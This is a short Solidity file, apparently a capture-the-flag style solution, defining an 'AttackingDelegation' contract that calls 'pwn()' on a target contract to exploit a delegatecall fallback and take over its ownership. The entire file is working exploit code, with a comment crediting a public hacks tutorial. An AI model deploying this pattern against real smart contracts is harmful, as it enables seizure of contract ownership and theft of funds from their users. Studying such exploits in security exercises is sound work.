// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegate public delegate;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegate = Delegate(contractAddress);
    }

    function hackContract() external {
        // code used from here => https://solidity-by-example.org/hacks/delegatecall
        address(delegate).call(abi.encodeWithSignature("pwn()"));
    }
}
